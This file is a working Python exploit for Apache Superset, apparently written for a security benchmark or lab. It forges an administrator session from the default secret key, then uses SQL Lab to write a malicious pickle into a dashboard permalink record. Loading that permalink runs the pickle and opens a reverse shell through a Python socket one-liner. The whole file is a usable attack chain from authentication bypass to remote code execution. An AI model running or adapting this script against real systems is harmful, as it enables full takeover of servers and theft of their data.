#!/usr/bin/env python3
"""Execute a shell through Superset's dashboard permalink deserialization."""

import base64
from http.cookies import SimpleCookie
import hashlib
import hmac
import json
import os
import pickle
import time
import urllib.error
import urllib.request
import uuid


SECRET_KEY = b"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET"


def base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def session_signature(message: bytes) -> str:
    derived_key = hmac.new(SECRET_KEY, b"cookie-session", hashlib.sha1).digest()
    return base64url(hmac.new(derived_key, message, hashlib.sha1).digest())


def forge_admin_session() -> str:
    payload = b'{"_user_id":1,"user_id":1}'
    timestamp = int(time.time())
    timestamp_bytes = timestamp.to_bytes((timestamp.bit_length() + 7) // 8, "big")
    message = f"{base64url(payload)}.{base64url(timestamp_bytes)}"
    return f"{message}.{session_signature(message.encode('ascii'))}"


class HttpClient:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.session = ""
        self.csrf_token = ""

    def request(self, path: str, body: dict | None = None) -> tuple[int, dict]:
        headers = {"Accept": "application/json"}
        data = None
        if self.session:
            headers["Cookie"] = f"session={self.session}"
        if body is not None:
            headers["Content-Type"] = "application/json"
            headers["X-CSRFToken"] = self.csrf_token
            data = json.dumps(body).encode("utf-8")
        request = urllib.request.Request(self.base_url + path, data=data, headers=headers)
        try:
            response = urllib.request.urlopen(request, timeout=120)
        except urllib.error.HTTPError as error:
            response = error
        for cookie_header in response.headers.get_all("Set-Cookie", []):
            cookies = SimpleCookie()
            cookies.load(cookie_header)
            if "session" in cookies:
                self.session = cookies["session"].value
        raw_body = response.read().decode("utf-8", errors="replace")
        try:
            parsed_body = json.loads(raw_body)
        except ValueError:
            parsed_body = {"text": raw_body[:300]}
        return response.status, parsed_body

    def post(self, path: str, body: dict) -> dict:
        status, result = self.request(path, body)
        if status not in (200, 201):
            raise RuntimeError(f"POST {path} failed with {status}: {result}")
        return result


class ShellPayload:
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        return os.system, (self.command,)


def shell_command() -> str:
    code = (
        'import os,socket;'
        's=socket.create_connection(("127.0.0.1",4444));'
        '[os.dup2(s.fileno(),fd) for fd in (0,1,2)];'
        'os.execl("/bin/sh","sh","-i")'
    )
    return "python3 -c '" + code + "'"


def sql_query(client: HttpClient, database_id: int, sql: str) -> dict:
    return client.post(
        "/superset/sql_json/",
        {"database_id": database_id, "sql": sql, "runAsync": False},
    )


def main() -> None:
    client = HttpClient(os.environ["REMOTE_TARGET_URL"])
    status, _ = client.request("/login/")
    if status != 200 or not client.session:
        raise RuntimeError("Target did not issue a login session")
    message, signature = client.session.rsplit(".", 1)
    if not hmac.compare_digest(signature, session_signature(message.encode())):
        raise RuntimeError("Target does not use the vulnerable default secret")
    client.session = forge_admin_session()
    status, identity = client.request("/api/v1/me/")
    if status != 200 or identity.get("result", {}).get("username") != "admin":
        raise RuntimeError("Forged administrator session was rejected")
    status, csrf = client.request("/api/v1/security/csrf_token/")
    if status != 200 or not csrf.get("result"):
        raise RuntimeError("Could not obtain CSRF token")
    client.csrf_token = csrf["result"]

    dashboard = client.post(
        "/api/v1/dashboard/", {"dashboard_title": "superset-002-" + uuid.uuid4().hex[:8]}
    )
    dashboard_id = dashboard["id"]
    permalink = client.post(f"/api/v1/dashboard/{dashboard_id}/permalink", {})
    permalink_key = permalink["key"]
    database = client.post(
        "/api/v1/database/",
        {
            "database_name": "superset-002-" + uuid.uuid4().hex[:8],
            "sqlalchemy_uri": "sqlite+pysqlite:////app/superset_home/superset.db",
            "expose_in_sqllab": True,
            "allow_dml": True,
        },
    )
    database_id = database["id"]
    rows = sql_query(
        client, database_id,
        "SELECT id FROM key_value WHERE resource='dashboard_permalink' "
        "ORDER BY id DESC LIMIT 1",
    ).get("data", [])
    if not rows:
        raise RuntimeError("Dashboard permalink row was not stored")
    row_id = int(rows[0]["id"])
    payload = pickle.dumps(ShellPayload(shell_command()), protocol=0)
    update = sql_query(
        client, database_id,
        "UPDATE key_value SET value=X'"
        + payload.hex()
        + f"' WHERE id={row_id} AND resource='dashboard_permalink'",
    )
    if update.get("status") != "success":
        raise RuntimeError(f"SQL Lab did not update permalink row: {update}")
    trigger_status, _ = client.request(f"/api/v1/dashboard/permalink/{permalink_key}")
    print(json.dumps({"evidence_payload": {
        "permalink_key": permalink_key,
        "trigger_status": trigger_status,
        "dashboard_id": dashboard_id,
    }}))


if __name__ == "__main__":
    main()
